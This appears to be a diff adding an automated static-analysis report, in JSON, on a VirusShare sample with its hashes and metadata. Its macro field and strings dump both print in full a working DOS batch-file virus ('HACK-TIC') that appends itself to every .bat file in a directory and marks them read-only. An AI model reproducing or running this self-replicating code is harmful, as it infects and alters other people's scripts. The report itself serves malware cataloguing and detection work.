@@ -1,0 +1,53 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "command": "May run PowerShell commands"
+        },
+        "macro": "@ctty nul:\ncopy %0.bat/A snotkop.&&&/A\necho HACK-TIC >snotkop.###\necho :reutel >>snotkop.###\necho ctty con: >>snotkop.###\ncopy snotkop.&&&/B+ snotkop.###/B\necho copy %%1 snotkop.$$$ > snotkop.bat\necho copy snotkop.&&& %%1 >> snotkop.bat\necho copy %%1/B+ snotkop.$$$ >> snotkop.bat\necho attrib +r %%1 >> snotkop.bat\nattrib +r snotkop.bat\nfor %%f in (*.bat) do command /c snotkop %%f\nattrib -r snotkop.bat\ndel snotkop.*\ngoto reutel\n\u001aHACK-TIC \n:reutel \nctty con: \necho ===============================================================================================\necho ============================================================================================="
+    },
+    "filename": "VirusShare_66e9e32cfab30c0a1c191fadd6a56c77",
+    "filesize": 679,
+    "filetype": "data",
+    "hashes": {
+        "md5": "66e9e32cfab30c0a1c191fadd6a56c77",
+        "sha1": "90f05bf337c8019f992ee95ef853fa1f1da51cff",
+        "sha256": "c1c59f5a238046c1c3b3341744a106f5195a7c7d7528502a5d8dcf89c01e84d9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ctty nul:",
+            "copy %0.bat/A snotkop.&&&/A",
+            "echo HACK-TIC >snotkop.###",
+            "echo :reutel >>snotkop.###",
+            "echo ctty con: >>snotkop.###",
+            "copy snotkop.&&&/B+ snotkop.###/B",
+            "echo copy %%1 snotkop.$$$ > snotkop.bat",
+            "echo copy snotkop.&&& %%1 >> snotkop.bat",
+            "echo copy %%1/B+ snotkop.$$$ >> snotkop.bat",
+            "echo attrib +r %%1 >> snotkop.bat",
+            "attrib +r snotkop.bat",
+            "for %%f in (*.bat) do command /c snotkop %%f",
+            "attrib -r snotkop.bat",
+            "del snotkop.*",
+            "goto reutel",
+            "HACK-TIC ",
+            ":reutel ",
+            "ctty con: ",
+            "echo ===============================================================================================",
+            "echo ============================================================================================="
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.270430",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
